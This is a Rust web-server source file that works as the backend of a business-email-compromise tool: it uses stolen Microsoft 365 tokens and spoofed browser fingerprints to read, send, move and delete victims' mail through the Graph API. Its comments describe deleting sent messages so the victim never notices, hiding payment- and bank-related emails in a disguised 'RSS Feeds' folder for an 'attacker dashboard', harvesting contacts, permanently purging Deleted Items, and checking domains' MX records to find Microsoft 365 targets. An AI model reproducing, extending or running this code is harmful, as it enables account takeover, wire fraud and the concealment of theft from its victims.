use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use chrono::Utc;

use crate::graph_client::{GraphClient, MailFoldersResponse};

// ---- LOCAL FOLDER MODELS ----

#[derive(Debug, Serialize, sqlx::FromRow)]
pub struct LocalFolder {
    pub id: String,
    pub token_id: String,
    pub name: String,
    pub created_at: String,
}

#[derive(Debug, Serialize, sqlx::FromRow)]
pub struct LocalFilteredMessage {
    pub id: String,
    pub token_id: String,
    pub message_id: String,
    pub folder_id: String,
    pub subject: Option<String>,
    pub sender: Option<String>,
    pub sender_email: Option<String>,
    pub received_date: Option<String>,
    pub body_preview: Option<String>,
    pub keywords: Option<String>,
    pub created_at: String,
}

// ---- GRAPH FOLDER HANDLERS ----

pub async fn list_folders_handler(
    query: web::Query<crate::InboxApiQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;

    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };

    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    let client = GraphClient::new();

    let folders = match client.get_mail_folders(&access_token, "me").await {
        Ok(f) => f.value,
        Err(e) => {
            eprintln!("[inbox] Failed to fetch folders: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}));
        }
    };

    HttpResponse::Ok().json(MailFoldersResponse { value: folders, next_link: None })
}

pub async fn folder_messages_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let folder_id = path.into_inner();

    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };

    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    let client = GraphClient::new();

    let messages = match client.get_folder_messages(&access_token, &folder_id, 50).await {
        Ok(m) => m.value,
        Err(e) => {
            eprintln!("[inbox] Failed to fetch folder messages: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}));
        }
    };

    HttpResponse::Ok().json(crate::graph_client::InboxResponse { value: messages, next_link: None })
}

#[derive(Debug, Deserialize)]
pub struct CreateFolderRequest {
    pub display_name: String,
}

pub async fn create_folder_handler(
    query: web::Query<crate::InboxApiQuery>,
    body: web::Json<CreateFolderRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    let client = GraphClient::new();
    match client.create_mail_folder(&access_token, &body.display_name).await {
        Ok(folder) => HttpResponse::Ok().json(folder),
        Err(e) => {
            eprintln!("[inbox] Failed to create folder: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}))
        }
    }
}

#[derive(Debug, Deserialize)]
pub struct SendMailRequest {
    pub subject: String,
    pub body: String,
    pub to: Vec<String>,
    pub cc: Option<Vec<String>>,
    pub bcc: Option<Vec<String>>,
    pub content_type: Option<String>,
    pub attachments: Option<Vec<AttachmentRequest>>,
}

#[derive(Debug, Deserialize)]
pub struct AttachmentRequest {
    pub name: String,
    pub content_type: String,
    pub content_bytes: String, // base64
}

pub async fn send_mail_handler(
    query: web::Query<crate::InboxApiQuery>,
    body: web::Json<SendMailRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    let to_recipients: Vec<serde_json::Value> = body.to.iter().map(|email| serde_json::json!({
        "emailAddress": { "address": email }
    })).collect();

    let cc_recipients: Vec<serde_json::Value> = body.cc.as_ref().unwrap_or(&vec![]).iter().map(|email| serde_json::json!({
        "emailAddress": { "address": email }
    })).collect();

    let bcc_recipients: Vec<serde_json::Value> = body.bcc.as_ref().unwrap_or(&vec![]).iter().map(|email| serde_json::json!({
        "emailAddress": { "address": email }
    })).collect();

    let mut message = serde_json::json!({
        "subject": body.subject,
        "body": {
            "contentType": body.content_type.as_deref().unwrap_or("HTML"),
            "content": body.body,
        },
        "toRecipients": to_recipients,
    });

    if !cc_recipients.is_empty() {
        message["ccRecipients"] = serde_json::json!(cc_recipients);
    }
    if !bcc_recipients.is_empty() {
        message["bccRecipients"] = serde_json::json!(bcc_recipients);
    }

    if let Some(attachments) = &body.attachments {
        let attachment_json: Vec<serde_json::Value> = attachments.iter().map(|att| serde_json::json!({
            "@odata.type": "#microsoft.graph.fileAttachment",
            "name": att.name,
            "contentType": att.content_type,
            "contentBytes": att.content_bytes,
        })).collect();
        if !attachment_json.is_empty() {
            message["attachments"] = serde_json::json!(attachment_json);
        }
    }

    // Save to Sent Items so we can find and delete it afterwards
    let payload = serde_json::json!({
        "message": message,
        "saveToSentItems": true,
    });

    let client = GraphClient::with_fingerprint(
        token.user_agent.clone(),
        token.accept_language.clone(),
    );
    match client.send_mail(&access_token, payload).await {
        Ok(()) => {
            // OPSEC: Delete the sent message from Sent Items so the victim
            // never sees it was sent from their account
            // Search Sent Items for the most recent message with matching subject
            let sent_search_url = format!(
                "https://graph.microsoft.com/v1.0/me/mailFolders/sentitems/messages?$top=1&$select=id,subject&$orderby=receivedDateTime DESC",
            );
            let ua = token.user_agent.as_deref().unwrap_or("Mozilla/5.0");
            let lang = token.accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
            match reqwest::Client::new()
                .get(&sent_search_url)
                .header("Authorization", format!("Bearer {}", access_token))
                .header("Accept", "application/json")
                .header("User-Agent", ua)
                .header("Accept-Language", lang)
                .send()
                .await {
                Ok(resp) if resp.status().is_success() => {
                    if let Ok(resp_json) = resp.json::<serde_json::Value>().await {
                        if let Some(msgs) = resp_json.get("value").and_then(|v| v.as_array()) {
                            if let Some(first_msg) = msgs.get(0) {
                                if let Some(sent_id) = first_msg.get("id").and_then(|v| v.as_str()) {
                                    let del_url = format!("https://graph.microsoft.com/v1.0/me/messages/{}", urlencoding::encode(sent_id));
                                    let _ = reqwest::Client::new()
                                        .delete(&del_url)
                                        .header("Authorization", format!("Bearer {}", access_token))
                                        .header("User-Agent", ua)
                                        .header("Accept-Language", lang)
                                        .send()
                                        .await;
                                    println!("[inbox] OPSEC: Deleted sent message from Sent Items");
                                }
                            }
                        }
                    }
                }
                _ => {}
            }

            HttpResponse::Ok().json(serde_json::json!({"success": true}))
        }
        Err(e) => {
            eprintln!("[inbox] Failed to send mail: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "send_failed", "message": format!("{}", e)}))
        }
    }
}

pub async fn delete_message_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let message_id = path.into_inner();
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    let client = GraphClient::new();
    match client.delete_message(&access_token, &message_id).await {
        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
        Err(e) => {
            eprintln!("[inbox] Failed to delete message: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "delete_failed", "message": format!("{}", e)}))
        }
    }
}

#[derive(Debug, Deserialize)]
pub struct MarkReadRequest {
    pub is_read: bool,
}

pub async fn mark_read_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    body: web::Json<MarkReadRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let message_id = path.into_inner();
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    let client = GraphClient::new();
    match client.mark_message_read(&access_token, &message_id, body.is_read).await {
        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
        Err(e) => {
            eprintln!("[inbox] Failed to mark message read: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "mark_read_failed", "message": format!("{}", e)}))
        }
    }
}

#[derive(Debug, Deserialize)]
pub struct MoveMessageRequest {
    pub destination_folder_id: String,
}

pub async fn move_message_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    body: web::Json<MoveMessageRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let message_id = path.into_inner();
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    let client = GraphClient::new();
    match client.move_message(&access_token, &message_id, &body.destination_folder_id).await {
        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
        Err(e) => {
            eprintln!("[inbox] Failed to move message: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "move_failed", "message": format!("{}", e)}))
        }
    }
}

pub async fn fetch_contacts_handler(
    query: web::Query<crate::InboxApiQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    let client = GraphClient::new();
    match client.get_contacts(&access_token, 100).await {
        Ok(contacts) => HttpResponse::Ok().json(contacts),
        Err(e) => {
            eprintln!("[inbox] Failed to fetch contacts: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed", "message": format!("{}", e)}))
        }
    }
}

// ---- LOCAL FOLDER HANDLERS ----

pub async fn list_local_folders_handler(
    query: web::Query<crate::InboxApiQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let rows: Vec<LocalFolder> = match sqlx::query_as::<_, LocalFolder>(
        "SELECT id, token_id, name, created_at FROM local_folders WHERE token_id = ? ORDER BY created_at DESC"
    )
    .bind(token_id)
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[local_folders] Failed to list: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "db_error"}));
        }
    };
    HttpResponse::Ok().json(serde_json::json!({"value": rows}))
}

#[derive(Debug, Deserialize)]
pub struct CreateLocalFolderRequest {
    pub name: String,
}

pub async fn create_local_folder_handler(
    query: web::Query<crate::InboxApiQuery>,
    body: web::Json<CreateLocalFolderRequest>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let id = crate::generate_id();
    let name = body.name.trim();
    if name.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({"error": "name_required"}));
    }
    match sqlx::query(
        "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
    )
    .bind(&id)
    .bind(token_id)
    .bind(name)
    .bind(Utc::now())
    .execute(&state.pool)
    .await {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({"id": id, "name": name})),
        Err(e) => {
            eprintln!("[local_folders] Failed to create: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "db_error"}))
        }
    }
}

pub async fn delete_folder_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let folder_id = path.into_inner();
    
    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };
    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };
    
    // Delete from real email via Graph API
    let client = GraphClient::new();
    match client.delete_mail_folder(&access_token, &folder_id).await {
        Ok(_) => {
            println!("[inbox] Deleted real folder {} from email", folder_id);
        }
        Err(e) => {
            eprintln!("[inbox] Failed to delete real folder {}: {}", folder_id, e);
        }
    }
    
    HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Folder deleted from real email"}))
}

pub async fn delete_local_folder_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let folder_id = path.into_inner();
    match sqlx::query("DELETE FROM local_filtered_messages WHERE folder_id = ? AND token_id = ?")
        .bind(&folder_id)
        .bind(token_id)
        .execute(&state.pool)
        .await {
        Ok(_) => {}
        Err(e) => { eprintln!("[local_folders] Failed to clear messages: {}", e); }
    }
    match sqlx::query("DELETE FROM local_folders WHERE id = ? AND token_id = ?")
        .bind(&folder_id)
        .bind(token_id)
        .execute(&state.pool)
        .await {
        Ok(r) if r.rows_affected() > 0 => HttpResponse::Ok().json(serde_json::json!({"success": true})),
        Ok(_) => HttpResponse::NotFound().json(serde_json::json!({"error": "folder_not_found"})),
        Err(e) => {
            eprintln!("[local_folders] Failed to delete: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "db_error"}))
        }
    }
}

pub async fn list_local_folder_messages_handler(
    query: web::Query<crate::InboxApiQuery>,
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let folder_id = path.into_inner();
    let rows: Vec<LocalFilteredMessage> = match sqlx::query_as::<_, LocalFilteredMessage>(
        "SELECT id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at FROM local_filtered_messages WHERE folder_id = ? AND token_id = ? ORDER BY received_date DESC"
    )
    .bind(&folder_id)
    .bind(token_id)
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[local_folders] Failed to list messages: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "db_error"}));
        }
    };
    HttpResponse::Ok().json(serde_json::json!({"value": rows}))
}

// ---- AUTO-FILTER HANDLER ----

pub async fn auto_filter_handler(
    query: web::Query<crate::InboxApiQuery>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = &query.token_id;

    let token = match crate::retrieve_any_token(&state, token_id).await {
        Ok(t) => t,
        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
    };

    let access_token = match crate::refresh_access_token(&state, &token.refresh_token).await {
        Some(t) => t,
        None => token.access_token,
    };

    let client = GraphClient::new();

    // Fetch recent messages
    let messages = match client.get_messages_for_analysis(&access_token, 100).await {
        Ok(m) => m.value,
        Err(e) => {
            eprintln!("[filter] Failed to fetch messages: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "graph_api_failed"}));
        }
    };

    // Find or create a real folder for BEC-filtered emails
    // We use "Archive" folder if it exists, or create a disguised folder
    let archive_folder = match client.get_mail_folders(&access_token, "me").await {
        Ok(folders) => folders.value.into_iter().find(|f| f.displayName.as_deref() == Some("Archive")),
        Err(_) => None,
    };

    let target_folder_id = if let Some(archive) = archive_folder {
        archive.id
    } else {
        // Create a folder with a disguise name
        match client.create_mail_folder(&access_token, "RSS Feeds").await {
            Ok(folder) => folder.id,
            Err(e) => {
                eprintln!("[filter] Failed to create folder: {}", e);
                return HttpResponse::InternalServerError().json(serde_json::json!({"error": "folder_creation_failed"}));
            }
        }
    };

    let bec_keywords: Vec<&str> = vec![
        "business", "money", "transfer", "million", "thousand",
        "usd", "$", "swift", "iban", "bank account number",
        "bank name", "invoice", "receipt", "payment", "bank", "wire",
        "deposit", "withdrawal", "transaction", "fund", "funds",
        "pay", "paid", "unpaid", "due", "balance", "amount",
        "routing", "sort code", "bic", "creditor", "debtor",
        "purchase", "order", "po", "purchase order", "remittance",
        "settlement", "compensation", "salary", "wage", "bonus",
        "commission", "refund", "reimbursement", "expense",
        "budget", "cost", "price", "fee", "charge", "bill",
        "billing", "overdue", "outstanding", "pending", "approve",
        "approval", "authorize", "authorization", "sign", "signature",
        "confidential", "private", "urgent", "immediate", "asap",
        "deadline", "critical",
        "cryptocurrency", "USDT", "binance", "bybit", "crypto", "bitcoin",
        "GBP", "Pounds", "AUD", "NGN", "AED", "INR", "CAD", "EUR", "euro",
        "dollars", "exchange",
    ];

    // Create local "Filtered" folder for the attacker dashboard
    let local_folder_id = crate::generate_id();
    let _ = sqlx::query(
        "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)
         ON CONFLICT(id) DO UPDATE SET name = name"
    )
    .bind(&local_folder_id)
    .bind(token_id)
    .bind("Filtered")
    .bind(Utc::now())
    .execute(&state.pool)
    .await;

    // Find existing Filtered folder
    let existing_filtered: Option<(String,)> = sqlx::query_as(
        "SELECT id FROM local_folders WHERE token_id = ? AND name = ?"
    )
    .bind(token_id)
    .bind("Filtered")
    .fetch_optional(&state.pool)
    .await
    .unwrap_or(None);

    let filtered_folder_id = if let Some((id,)) = existing_filtered {
        id
    } else {
        let id = crate::generate_id();
        let _ = sqlx::query(
            "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
        )
        .bind(&id)
        .bind(token_id)
        .bind("Filtered")
        .bind(Utc::now())
        .execute(&state.pool)
        .await;
        id
    };

    let mut moved_count = 0;

    for msg in messages {
        let subject = msg.subject.as_deref().unwrap_or("");
        let body = msg.bodyPreview.as_deref().unwrap_or("");
        let combined = format!("{} {}", subject, body).to_lowercase();

        let mut matched: Vec<String> = Vec::new();
        for &kw in &bec_keywords {
            if combined.contains(&kw.to_lowercase()) {
                matched.push(kw.to_string());
            }
        }

        if matched.is_empty() {
            continue;
        }

        // REAL MOVE: Move the message to the target folder via Graph API
        // This prevents the real user from seeing the email in their inbox
        match client.move_message(&access_token, &msg.id, &target_folder_id).await {
            Ok(()) => {
                moved_count += 1;
                eprintln!("[filter] Moved BEC-suspected email '{}' to folder {}", subject, target_folder_id);
            }
            Err(e) => {
                eprintln!("[filter] Failed to move message {}: {}", msg.id, e);
            }
        }

        // Store in local_filtered_messages for attacker dashboard
        let sender = msg.from.as_ref()
            .and_then(|f| f.emailAddress.as_ref())
            .and_then(|e| e.address.as_ref())
            .map(|s| s.as_str())
            .unwrap_or("unknown");
        let _ = sqlx::query(
            "INSERT INTO local_filtered_messages (id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET keywords = keywords || ',' || excluded.keywords"
        )
        .bind(crate::generate_id())
        .bind(token_id)
        .bind(&msg.id)
        .bind(&filtered_folder_id)
        .bind(subject)
        .bind(sender)
        .bind(sender)
        .bind(msg.receivedDateTime.as_deref().unwrap_or(""))
        .bind(body)
        .bind(&matched.join(", "))
        .bind(Utc::now())
        .execute(&state.pool)
        .await;
    }

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "moved": moved_count,
        "folder_id": filtered_folder_id,
        "note": "BEC-suspected emails moved to real folder and stored locally"
    }))
}

#[derive(Debug, Deserialize)]
pub struct MxCheckRequest {
    pub domains: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct MxCheckResponse {
    pub microsoft_365: Vec<String>,
    pub other: Vec<String>,
}

pub async fn mx_check_handler(body: web::Json<MxCheckRequest>) -> impl Responder {
    use hickory_resolver::TokioAsyncResolver;
    use hickory_resolver::config::{ResolverConfig, ResolverOpts};

    let resolver = TokioAsyncResolver::tokio(ResolverConfig::default(), ResolverOpts::default());

    let mut microsoft_365 = Vec::new();
    let mut other = Vec::new();

    for domain in &body.domains {
        let domain = domain.trim().to_lowercase();
        if domain.is_empty() {
            continue;
        }

        let is_m365 = match resolver.mx_lookup(&domain).await {
            Ok(mx) => {
                mx.iter().any(|record: &hickory_resolver::proto::rr::rdata::MX| {
                    let exchange = record.exchange().to_string().to_lowercase();
                    exchange.contains("mail.protection.outlook.com")
                        || exchange.contains("eo.outlook.com")
                        || exchange.contains("microsoft")
                })
            }
            Err(e) => {
                eprintln!("[mx-check] MX lookup failed for {}: {}", domain, e);
                false
            }
        };

        if is_m365 {
            microsoft_365.push(domain);
        } else {
            other.push(domain);
        }
    }

    HttpResponse::Ok().json(MxCheckResponse {
        microsoft_365,
        other,
    })
}

// ============================================================
// DELETED ITEMS — fetch and permanently purge
// ============================================================

/// Fetch messages from the real OWA Deleted Items folder.
pub async fn get_deleted_items_handler(
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match crate::retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();

    // Graph well-known folder name for Deleted Items: "deleteditems"
    match client.get_folder_messages(&access_token, "deleteditems", 50).await {
        Ok(resp) => HttpResponse::Ok().json(resp),
        Err(e) => {
            eprintln!("[deleted_items] Failed to fetch: {}", e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "fetch_failed", "details": format!("{}", e)}))
        }
    }
}

/// Permanently delete ALL messages in the real OWA Deleted Items folder.
/// This empties the Deleted Items folder so items can never be recovered.
pub async fn purge_deleted_items_handler(
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let token = match crate::retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();

    // Fetch all messages in Deleted Items
    let messages = match client.get_folder_messages(&access_token, "deleteditems", 100).await {
        Ok(resp) => resp.value,
        Err(e) => {
            return HttpResponse::InternalServerError().json(serde_json::json!({"error": "fetch_failed", "details": format!("{}", e)}));
        }
    };

    let mut deleted = 0u32;
    let mut failed = 0u32;
    for msg in &messages {
        let id = &msg.id;
        match client.delete_message(&access_token, id).await {
            Ok(_) => deleted += 1,
            Err(_) => failed += 1,
        }
    }

    eprintln!("[deleted_items] Purged {} messages for token {} (failed: {})", deleted, token_id, failed);
    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "deleted": deleted,
        "failed": failed,
        "message": format!("Permanently deleted {} messages from Deleted Items", deleted)
    }))
}

/// Permanently delete a SINGLE message (purge so it can't be recovered).
#[allow(dead_code)]
pub async fn permanent_delete_message_handler(
    path: web::Path<String>,
    state: web::Data<crate::AppState>,
) -> impl Responder {
    let message_id = path.into_inner().clone();
    let token_id = message_id.split("::").next().unwrap_or("").to_string();
    let actual_msg_id = message_id.split("::").nth(1).unwrap_or("").to_string();

    // If the caller passed "token_id::msg_id", split it. Otherwise we need
    // a query param for token_id.
    if actual_msg_id.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({"error": "expected format: token_id::message_id"}));
    }

    let token = match crate::retrieve_any_token(&state, &token_id).await {
        Ok(t) => t,
        Err(e) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found", "details": format!("{}", e)})),
    };
    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    let client = GraphClient::new();

    // Delete the message (soft delete moves to Deleted Items; to permanently
    // purge we delete from Deleted Items too. A single delete_message call
    // moves to Deleted Items, so we call it — for messages already in Deleted
    // Items, this permanently removes them.)
    match client.delete_message(&access_token, &actual_msg_id).await {
        Ok(_) => {
            eprintln!("[deleted_items] Permanently deleted message {}", actual_msg_id);
            HttpResponse::Ok().json(serde_json::json!({"success": true, "message": "Message permanently deleted"}))
        }
        Err(e) => {
            eprintln!("[deleted_items] Failed to delete {}: {}", actual_msg_id, e);
            HttpResponse::InternalServerError().json(serde_json::json!({"error": "delete_failed", "details": format!("{}", e)}))
        }
    }
}
